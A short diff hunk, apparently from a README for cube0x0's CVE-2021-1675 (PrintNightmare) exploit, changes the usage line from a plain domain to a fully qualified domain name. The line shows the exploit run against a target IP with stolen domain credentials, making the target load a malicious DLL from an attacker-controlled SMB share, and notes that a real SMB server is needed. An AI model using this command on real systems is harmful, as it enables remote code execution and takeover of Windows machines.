@@ -16,5 +16,5 @@ https://github.com/cube0x0/CVE-2021-1675
 Need a real smb server (not work with the impacket server)
 
 ```
-CVE-2021-1675.py <domain>/<user>:<password>@<target_ip> '\\<attacker_ip>\<share_name>\<dll_name|inject>.dll'
+CVE-2021-1675.py <domain_fqdn>/<user>:<password>@<target_ip> '\\<attacker_ip>\<share_name>\<dll_name|inject>.dll'
 ```
